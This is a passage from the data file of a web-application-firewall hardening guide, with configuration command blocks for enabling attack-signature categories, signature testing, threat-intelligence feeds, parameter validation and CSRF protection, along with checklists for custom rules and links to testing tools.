                    <div><span class="code-command">category</span> <span class="code-value">"cross-site-scripting"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"command-execution"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"xml-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"ssrf"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"path-traversal"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"remote-file-inclusion"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"deserialization"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Modern Application Attack Coverage</h5>
                <p class="mb-4 text-gray-700">Configure protection for attacks targeting modern application technologies:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure modern application attack coverage</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div class="code-comment"># GraphQL injection protection</div>
                    <div><span class="code-command">category</span> <span class="code-value">"graphql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">graphql-protection</span></div>
                    <div><span class="code-param">max-query-depth</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">max-query-complexity</span> <span class="code-value">100</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># NoSQL injection protection</div>
                    <div><span class="code-command">category</span> <span class="code-value">"nosql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div class="code-comment"># JWT token attack protection</div>
                    <div><span class="code-command">category</span> <span class="code-value">"jwt-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">jwt-protection</span></div>
                    <div><span class="code-param">algorithm-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-algorithms</span> <span class="code-value">"RS256,ES256"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># WebSocket attack protection</div>
                    <div><span class="code-command">category</span> <span class="code-value">"websocket-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">websocket-protection</span></div>
                    <div><span class="code-param">max-message-size</span> <span class="code-value">65536</span></div>
                    <div><span class="code-param">max-frame-size</span> <span class="code-value">16384</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Signature Testing and Validation',
            content: `
                <p class="mb-4 text-gray-700">Implement systematic testing to validate signature effectiveness and minimize false positives.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure signature testing environment</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">test-environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Signature-Testing"</span></div>
                    <div><span class="code-command">test-environment</span> <span class="code-value">"Signature-Testing"</span></div>
                    <div><span class="code-param">traffic-capture</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">capture-percentage</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">capture-duration</span> <span class="code-value">86400</span></div>
                    <div class="code-comment"># Configure signature A/B testing</div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal-Testing"</span> <span class="code-param">clone-from</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal-Testing"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">mode</span> <span class="code-value">simulation</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Signature Testing Methodology</h5>
                <p class="mb-4 text-gray-700">A systematic approach to testing WAF signatures ensures optimal protection with minimal false positives:</p>
                
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2">Baseline Testing - Measure current false positive rate and protection effectiveness</li>
                    <li class="mb-2">Attack Vector Testing - Use known payloads to validate detection capabilities</li>
                    <li class="mb-2">Evasion Testing - Test common bypass techniques against signature base</li>
                    <li class="mb-2">False Positive Testing - Run legitimate traffic patterns to identify false positives</li>
                    <li class="mb-2">Performance Testing - Measure latency impact of signature sets</li>
                    <li class="mb-2">Selective Deployment - Deploy verified signatures to production gradually</li>
                    <li class="mb-2">Regression Testing - Ensure fixes don't introduce new issues</li>
                    <li>Continuous Monitoring - Watch for emerging false positives or security gaps</li>
                </ol>
                
                <div class="code-block">
                    <div class="code-comment"># Configure automated signature testing</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">test-automation</span></div>
                    <div><span class="code-param">schedule</span> <span class="code-value">weekly</span></div>
                    <div><span class="code-param">day</span> <span class="code-value">sunday</span></div>
                    <div><span class="code-param">time</span> <span class="code-value">01:00</span></div>
                    <div class="code-comment"># Set up test suites</div>
                    <div><span class="code-command">test-suite</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"SQLi-Test"</span> <span class="code-param">category</span> <span class="code-value">"sql-injection"</span></div>
                    <div><span class="code-command">test-suite</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"XSS-Test"</span> <span class="code-param">category</span> <span class="code-value">"cross-site-scripting"</span></div>
                    <div><span class="code-command">test-suite</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"False-Positive-Test"</span> <span class="code-param">traffic-source</span> <span class="code-value">"recorded-traffic"</span></div>
                    <div class="code-comment"># Configure test reporting</div>
                    <div><span class="code-param">report-format</span> <span class="code-value">json</span></div>
                    <div><span class="code-param">report-destination</span> <span class="code-value">email</span> <span class="code-param">address</span> <span class="code-value">"security-team@example.com"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Threat Intelligence Integration',
            content: `
                <p class="mb-4 text-gray-700">Leverage threat intelligence to enhance attack signature capabilities and stay ahead of emerging threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure threat intelligence integration</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">threat-intelligence</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure IP reputation feeds</div>
                    <div><span class="code-command">ip-reputation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">update-frequency</span> <span class="code-value">hourly</span></div>
                    <div><span class="code-param">block-high-risk</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">challenge-medium-risk</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">log-low-risk</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">feed</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Radware-ThreatFeed"</span> <span class="code-param">type</span> <span class="code-value">"built-in"</span></div>
                    <div><span class="code-command">feed</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Custom-Blocklist"</span> <span class="code-param">type</span> <span class="code-value">"custom"</span> <span class="code-param">url</span> <span class="code-value">"https://security.example.com/blocklist.txt"</span> <span class="code-param">auth-method</span> <span class="code-value">"basic"</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Configure IOC-based signature generation</div>
                    <div><span class="code-command">ioc-signatures</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">automatic-generation</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">feed</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"MISP-Feed"</span> <span class="code-param">type</span> <span class="code-value">"misp"</span> <span class="code-param">url</span> <span class="code-value">"https://misp.example.org/feed"</span> <span class="code-param">api-key</span> <span class="code-value">encrypt</span></div>
                    <div><span class="code-param">ioc-types</span> <span class="code-value">"url,filename,hash,user-agent"</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Configure CVE-based signature deployment</div>
                    <div><span class="code-command">cve-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">auto-protect</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">minimum-cvss</span> <span class="code-value">7.0</span></div>
                    <div><span class="code-param">protected-technologies</span> <span class="code-value">"apache,nginx,php,nodejs,wordpress"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Threat Intelligence Integration Benefits</h5>
                <p class="mb-4 text-gray-700">Integrating threat intelligence with WAF signatures provides several key advantages:</p>
                
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2">Early detection of emerging threats before formal signatures are available</li>
                    <li class="mb-2">Rapid response to zero-day vulnerabilities through virtual patching</li>
                    <li class="mb-2">Context-aware protection based on threat actor tactics and techniques</li>
                    <li class="mb-2">Reduction of false positives through reputation-based filtering</li>
                    <li class="mb-2">Automated signature generation from validated indicators of compromise</li>
                    <li>Industry-specific protection tailored to your application's threat landscape</li>
                </ul>
                
                <div class="code-block">
                    <div class="code-comment"># Configure SIEM integration for correlation</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">log-management</span></div>
                    <div><span class="code-command">siem-integration</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">format</span> <span class="code-value">cef</span></div>
                    <div><span class="code-param">syslog-server</span> <span class="code-value">10.0.0.50</span></div>
                    <div><span class="code-param">syslog-port</span> <span class="code-value">514</span></div>
                    <div><span class="code-param">syslog-protocol</span> <span class="code-value">tcp</span></div>
                    <div><span class="code-param">facility</span> <span class="code-value">local5</span></div>
                    <div><span class="code-param">include-threat-intelligence</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        }
    ],
    tools: [
        {
            title: 'Attack Signature Testing Tool',
            icon: 'fa-vial',
            description: 'Test signature effectiveness against both attack payloads and legitimate traffic.',
            link: 'https://github.com/OWASP/Amass',
            linkText: 'OWASP Amass'
        },
        {
            title: 'False Positive Analyzer',
            icon: 'fa-filter',
            description: 'Analyze WAF logs to identify and address false positive triggers.',
            link: 'https://www.elastic.co/kibana',
            linkText: 'Kibana'
        },
        {
            title: 'Payload Generator',
            icon: 'fa-code',
            description: 'Generate attack payloads for testing WAF signature effectiveness.',
            link: 'https://github.com/swisskyrepo/PayloadsAllTheThings',
            linkText: 'PayloadsAllTheThings'
        },
        {
            title: 'Signature Update Monitor',
            icon: 'fa-bell',
            description: 'Monitor for new attack signatures and security updates from Radware.',
            link: 'https://www.radware.com/security-updates/',
            linkText: 'Radware Security'
        },
        {
            title: 'ModSecurity Rule Editor',
            icon: 'fa-edit',
            description: 'Create and edit custom WAF signatures using ModSecurity rule syntax.',
            link: 'https://github.com/SpiderLabs/ModSecurity',
            linkText: 'ModSecurity'
        },
        {
            title: 'OWASP CRS Testing Tool',
            icon: 'fa-check-circle',
            description: 'Test WAF configurations against OWASP Core Rule Set to ensure proper coverage.',
            link: 'https://coreruleset.org/',
            linkText: 'OWASP CRS'
        },
        {
            title: 'WAF Bypass Tool',
            icon: 'fa-user-secret',
            description: 'Test signature evasion techniques to identify potential security gaps.',
            link: 'https://github.com/wafpassproject/wafpass',
            linkText: 'WAFPass'
        },
        {
            title: 'MISP Threat Intelligence Platform',
            icon: 'fa-globe',
            description: 'Open source threat intelligence platform for sharing and integrating IOCs.',
            link: 'https://www.misp-project.org/',
            linkText: 'MISP Project'
        },
        {
            title: 'Regex Testing Tool',
            icon: 'fa-cogs',
            description: 'Test and optimize regular expressions used in custom signatures.',
            link: 'https://regex101.com/',
            linkText: 'Regex101'
        },
        {
            title: 'AlienVault OTX',
            icon: 'fa-shield-alt',
            description: 'Open Threat Exchange platform for collecting and sharing threat intelligence.',
            link: 'https://otx.alienvault.com/',
            linkText: 'OTX'
        },
        {
            title: 'WAF Performance Analyzer',
            icon: 'fa-tachometer-alt',
            description: 'Measure performance impact of signature rules on traffic processing.',
            link: 'https://jmeter.apache.org/',
            linkText: 'Apache JMeter'
        },
        {
            title: 'CVE Database Integration',
            icon: 'fa-database',
            description: 'Connect to vulnerability databases for automatic virtual patching.',
            link: 'https://nvd.nist.gov/vuln/data-feeds',
            linkText: 'NVD Data Feeds'
        }
    ]
},
       {
    id: 'custom-rules',
    title: '6. Custom Security Rules',
    subtitle: 'Building application-specific protections and custom filters',
    icon: 'fa-code',
    priority: 'high',
    progress: 0,
    checklist: [
        {
            title: '6.1 Rule Development',
            icon: 'fa-pencil-ruler',
            items: [
                { id: '6.1.1', text: 'Create custom security rules based on application logic', priority: 'high' },
                { id: '6.1.2', text: 'Develop parameter validation rules (format, length, type)', priority: 'critical' },
                { id: '6.1.3', text: 'Configure correlation rules for complex attack patterns', priority: 'high' },
                { id: '6.1.4', text: 'Set up rate limiting for specific application functions', priority: 'medium' },
                { id: '6.1.5', text: 'Create transaction validation rules (multi-request)', priority: 'high' },
                { id: '6.1.6', text: 'Implement regex-based pattern matching for application data', priority: 'high' },
                { id: '6.1.7', text: 'Define rules for sensitive operation protection', priority: 'critical' },
                { id: '6.1.8', text: 'Develop contextual validation rules based on user roles', priority: 'high' },
                { id: '6.1.9', text: 'Create state-based validation sequences for multi-step operations', priority: 'high' },
                { id: '6.1.10', text: 'Implement content transformation rules (normalization, canonicalization)', priority: 'medium' },
                { id: '6.1.11', text: 'Define rules for API-specific parameter validation', priority: 'critical' },
                { id: '6.1.12', text: 'Set up business logic validation rules for domain-specific constraints', priority: 'high' },
                { id: '6.1.13', text: 'Create custom rules for response body inspection', priority: 'medium' },
                { id: '6.1.14', text: 'Develop request chaining rules for session validation', priority: 'high' }
            ]
        },
        {
            title: '6.2 Rule Testing and Optimization',
            icon: 'fa-vial',
            items: [
                { id: '6.2.1', text: 'Test custom rules against legitimate traffic', priority: 'critical' },
                { id: '6.2.2', text: 'Validate rule effectiveness against attack scenarios', priority: 'high' },
                { id: '6.2.3', text: 'Monitor rule performance impact', priority: 'medium' },
                { id: '6.2.4', text: 'Optimize rule execution order for performance', priority: 'medium' },
                { id: '6.2.5', text: 'Document rule purpose, logic, and expected behavior', priority: 'high' },
                { id: '6.2.6', text: 'Implement rule versioning and change management', priority: 'medium' },
                { id: '6.2.7', text: 'Create automated rule testing framework', priority: 'medium' },
                { id: '6.2.8', text: 'Set up rule benchmarking for performance optimization', priority: 'medium' },
                { id: '6.2.9', text: 'Implement A/B testing methodology for rule deployment', priority: 'medium' },
                { id: '6.2.10', text: 'Create regression test suite for rule validation', priority: 'high' },
                { id: '6.2.11', text: 'Perform stress testing of computationally intensive rules', priority: 'medium' },
                { id: '6.2.12', text: 'Set up synthetic transaction monitoring for rule validation', priority: 'medium' },
                { id: '6.2.13', text: 'Establish rule effectiveness metrics and measurements', priority: 'high' },
                { id: '6.2.14', text: 'Create failsafe mechanisms for rule fallback', priority: 'high' }
            ]
        },
        {
            title: '6.3 Advanced Rule Applications',
            icon: 'fa-puzzle-piece',
            items: [
                { id: '6.3.1', text: 'Create data leakage prevention rules', priority: 'high' },
                { id: '6.3.2', text: 'Set up application logic defenses (anti-CSRF, workflow)', priority: 'critical' },
                { id: '6.3.3', text: 'Configure virtual patching for known vulnerabilities', priority: 'critical' },
                { id: '6.3.4', text: 'Implement API-specific security rules', priority: 'high' },
                { id: '6.3.5', text: 'Create environment-specific rule variations (dev/test/prod)', priority: 'medium' },
                { id: '6.3.6', text: 'Implement behavioral analysis rules', priority: 'high' },
                { id: '6.3.7', text: 'Configure custom error detection and prevention', priority: 'medium' },
                { id: '6.3.8', text: 'Create rules for legacy application protection', priority: 'high' },
                { id: '6.3.9', text: 'Implement rules for session consistency validation', priority: 'high' },
                { id: '6.3.10', text: 'Set up contextual authentication rules', priority: 'critical' },
                { id: '6.3.11', text: 'Create business transaction monitoring rules', priority: 'medium' },
                { id: '6.3.12', text: 'Implement custom rules for bot detection and mitigation', priority: 'high' },
                { id: '6.3.13', text: 'Set up rules for detecting account takeover attempts', priority: 'critical' },
                { id: '6.3.14', text: 'Configure application-specific encryption validation rules', priority: 'high' }
            ]
        },
        {
            title: '6.4 Rule Integration',
            icon: 'fa-plug',
            items: [
                { id: '6.4.1', text: 'Integrate custom rules with log management systems', priority: 'high' },
                { id: '6.4.2', text: 'Configure rule alerts and notifications', priority: 'high' },
                { id: '6.4.3', text: 'Set up rule synchronization across multiple environments', priority: 'medium' },
                { id: '6.4.4', text: 'Implement rule integration with CI/CD pipelines', priority: 'high' },
                { id: '6.4.5', text: 'Create rule export/import mechanisms', priority: 'medium' },
                { id: '6.4.6', text: 'Configure rule interaction with threat intelligence feeds', priority: 'high' },
                { id: '6.4.7', text: 'Set up rule metadata for compliance reporting', priority: 'medium' },
                { id: '6.4.8', text: 'Implement rule-based triggers for security orchestration', priority: 'high' },
                { id: '6.4.9', text: 'Create custom rule dashboards and reporting', priority: 'medium' },
                { id: '6.4.10', text: 'Set up rule effectiveness analytics', priority: 'medium' }
            ]
        },
        {
            title: '6.5 Dynamic Rule Management',
            icon: 'fa-sync-alt',
            items: [
                { id: '6.5.1', text: 'Implement dynamic rule activation based on threat intelligence', priority: 'high' },
                { id: '6.5.2', text: 'Configure adaptive rule sensitivity based on risk scoring', priority: 'high' },
                { id: '6.5.3', text: 'Set up automated rule tuning based on false positive analysis', priority: 'medium' },
                { id: '6.5.4', text: 'Create rule schedules for time-based activation', priority: 'medium' },
                { id: '6.5.5', text: 'Implement traffic-based rule prioritization', priority: 'high' },
                { id: '6.5.6', text: 'Configure geographic-based rule activation', priority: 'medium' },
                { id: '6.5.7', text: 'Set up dynamic rule chains based on initial detection', priority: 'high' },
                { id: '6.5.8', text: 'Implement seasonal/promotional rule adjustments', priority: 'medium' },
                { id: '6.5.9', text: 'Configure user-behavior-based rule activation', priority: 'high' },
                { id: '6.5.10', text: 'Create event-triggered rule deployment', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Custom Parameter Validation Rules',
            content: `
                <p class="mb-4 text-gray-700">Create validation rules for application parameters to prevent injection attacks and parameter tampering.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure parameter validation rules</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">parameter-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Create parameter type definitions</div>
                    <div><span class="code-command">parameter-type</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user-id"</span></div>
                    <div><span class="code-command">parameter-type</span> <span class="code-value">"user-id"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"^[A-Za-z0-9_-]{3,20}$"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Alphanumeric username, 3-20 chars"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Create parameter validation rule</div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"username"</span> <span class="code-param">type</span> <span class="code-value">"user-id"</span> <span class="code-param">enforcement</span> <span class="code-value">mandatory</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"email"</span> <span class="code-param">type</span> <span class="code-value">"email"</span> <span class="code-param">enforcement</span> <span class="code-value">mandatory</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"account-id"</span> <span class="code-param">type</span> <span class="code-value">"integer"</span> <span class="code-param">min-value</span> <span class="code-value">1000</span> <span class="code-param">max-value</span> <span class="code-value">9999999</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"comment"</span> <span class="code-param">type</span> <span class="code-value">"text"</span> <span class="code-param">max-length</span> <span class="code-value">1000</span> <span class="code-param">allowed-metacharacters</span> <span class="code-value">".,!?()-"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Parameter Validation Strategies</h5>
                <p class="mb-4 text-gray-700">Effective parameter validation should implement multiple layers of protection:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Positive Validation:</strong> Define exactly what's allowed rather than what's forbidden</li>
                    <li class="mb-2"><strong>Type Enforcement:</strong> Validate data types (numeric, alphanumeric, date, etc.)</li>
                    <li class="mb-2"><strong>Range Checking:</strong> Enforce minimum/maximum values and lengths</li>
                    <li class="mb-2"><strong>Character Set Limitations:</strong> Restrict to only necessary characters</li>
                    <li class="mb-2"><strong>Format Validation:</strong> Enforce specific formats (email, phone, etc.)</li>
                    <li><strong>Required Parameters:</strong> Ensure required fields are present</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Context-Aware Parameter Validation</h5>
                <p class="mb-4 text-gray-700">Implement context-sensitive parameter validation based on user roles and application state:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure context-aware parameter validation</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">parameter-validation</span></div>
                    <div class="code-comment"># Create context-based parameter rules</div>
                    <div><span class="code-command">context</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"admin-context"</span></div>
                    <div><span class="code-command">context</span> <span class="code-value">"admin-context"</span></div>
                    <div><span class="code-param">detection-method</span> <span class="code-value">cookie</span></div>
                    <div><span class="code-param">cookie-name</span> <span class="code-value">"user_role"</span></div>
                    <div><span class="code-param">cookie-value</span> <span class="code-value">"admin"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Link parameters to contexts</div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user_action"</span> <span class="code-param">context</span> <span class="code-value">"admin-context"</span> <span class="code-param">allowed-values</span> <span class="code-value">"create,read,update,delete,grant,revoke"</span></div>
                    <div><span class="code-command">parameter</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user_action"</span> <span class="code-param">context</span> <span class="code-value">"default"</span> <span class="code-param">allowed-values</span> <span class="code-value">"read"</span></div>
                    <div class="code-comment"># Multi-parameter validation rule</div>
                    <div><span class="code-command">validation-rule</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"date-range-check"</span></div>
                    <div><span class="code-command">validation-rule</span> <span class="code-value">"date-range-check"</span></div>
                    <div><span class="code-param">parameter1</span> <span class="code-value">"start_date"</span></div>
                    <div><span class="code-param">parameter2</span> <span class="code-value">"end_date"</span></div>
                    <div><span class="code-param">operator</span> <span class="code-value">"less-than-or-equal"</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Anti-CSRF Protection Rules',
            content: `
                <p class="mb-4 text-gray-700">Configure Cross-Site Request Forgery (CSRF) protection to prevent attackers from forcing users to perform unwanted actions.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure CSRF protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">csrf-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">enforcement</span> <span class="code-value">block</span></div>
                    <div class="code-comment"># Configure CSRF token settings</div>
                    <div><span class="code-param">token-name</span> <span class="code-value">"csrf_token"</span></div>
                    <div><span class="code-param">token-location</span> <span class="code-value">"header,parameter"</span></div>
                    <div><span class="code-param">token-format</span> <span class="code-value">"alphanumeric"</span></div>
                    <div><span class="code-param">token-length</span> <span class="code-value">32</span></div>
                    <div class="code-comment"># Define protected URLs (POST endpoints that modify state)</div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/user/update"</span> <span class="code-param">methods</span> <span class="code-value">"POST,PUT"</span></div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/admin/*"</span> <span class="code-param">methods</span> <span class="code-value">"POST,PUT,DELETE"</span></div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/user/settings"</span> <span class="code-param">methods</span> <span class="code-value">"POST"</span></div>
                    <div class="code-comment"># Add exemptions for specific APIs</div>
                    <div><span class="code-command">exemption</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/webhook/callback"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Protection Strategies</h5>
                <p class="mb-4 text-gray-700">Comprehensive CSRF protection combines multiple security mechanisms:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Token Validation:</strong> Unique tokens for each session/user</li>
                    <li class="mb-2"><strong>Referer Validation:</strong> Verify requests come from your domain</li>
                    <li class="mb-2"><strong>SameSite Cookies:</strong> Configure cookies with SameSite=Strict/Lax</li>
                    <li class="mb-2"><strong>Custom Headers:</strong> Require custom headers on sensitive requests</li>
                    <li><strong>Form-Specific Tokens:</strong> Unique tokens for different forms/actions</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced CSRF Protection Implementation</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated CSRF protection with multiple layers of defense:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced CSRF protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">csrf-protection</span></div>
                    <div class="code-comment"># Enable dual token validation</div>
                    <div><span class="code-param">dual-token-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cookie-token-name</span> <span class="code-value">"XSRF-TOKEN"</span></div>
                    <div><span class="code-param">header-token-name</span> <span class="code-value">"X-XSRF-TOKEN"</span></div>
                    <div class="code-comment"># Configure referer validation</div>
                    <div><span class="code-command">referer-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-domains</span> <span class="code-value">add</span> <span class="code-param">domain</span> <span class="code-value">"example.com"</span></div>
                    <div><span class="code-param">allowed-domains</span> <span class="code-value">add</span> <span class="code-param">domain</span> <span class="code-value">"secure.example.com"</span></div>
                    <div><span class="code-param">strict-validation</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure token expiration and rotation</div>
                    <div><span class="code-param">token-lifetime</span> <span class="code-value">1800</span></div>
                    <div><span class="code-param">token-rotation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-rotation-period</span> <span class="code-value">600</span></div>
                    <div class="code-comment"># Configure action-specific tokens</div>
                    <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/admin/delete-user"</span> <span class="code-param">methods</span> <span class="code-value">"POST"</span> <span class="code-param">action-specific-token</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Virtual Patching Rules',
            content: `
                <p class="mb-4 text-gray-700">Implement virtual patches to protect against known vulnerabilities without modifying application code.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure virtual patching for a known vulnerability</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">virtual-patches</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Create a virtual patch for CVE-2023-XXXXX (example)</div>
